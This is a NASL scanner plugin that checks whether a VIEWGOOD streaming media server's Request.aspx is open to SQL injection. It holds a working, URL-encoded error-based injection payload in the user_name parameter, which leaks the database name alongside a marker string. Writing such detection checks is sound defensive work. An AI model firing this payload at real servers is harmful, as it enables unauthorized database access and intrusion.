############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");


if(description)
{
 script_id(51799039);
 name = "VIEWGOOD Streaming media system Request.aspx - SQL injection";
 script_name(name);
 script_category(ACT_ATTACK);
 script_family(english:"Camera");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_set_attribute(attribute:"risk_factor", value:"High");
 script_set_attribute(attribute:"description", value:"VIEWGOOD VOD system module is one of the important modules of streaming media service platform solution. Post injection vulnerability in ancient streaming media system can lead to data leakage and even server intrusion.");
 script_set_attribute(attribute:"solution", value:"1. Upgrade to the latest version of the link address on the official website: http://www.viewgood.com/; 2. Deploy the web application firewall to monitor the database operation; 3. Strictly filter the data entered by users in the web code.");
 script_end_attributes();
 script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
include("misc_func.inc");
include("openvas-https.inc");

function check_vuln(port){
	url = string("/VIEWGOOD/Pc/Content/Request.aspx?action=name_check&user_name=%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))>0--:");
	req = http_get(item:url, port:port);
    recv = http_keepalive_send_recv(data:req, port:port, bodyonly:FALSE);
	if( recv == NULL) exit(0);
	con = req + recv;
	if("500 "><recv && "testXQ17"><recv){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}

function check_vuln_ssl(port){
	url = string("/VIEWGOOD/Pc/Content/Request.aspx?action=name_check&user_name=%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))>0--:");
	req = http_get(item:url, port:port);
    ssl_req = https_req_get(port:port , request:req);
	if( ssl_req == NULL) exit(0);
	con = req + ssl_req;
	if("500 "><ssl_req && "testXQ17"><ssl_req){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}

##################################

kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}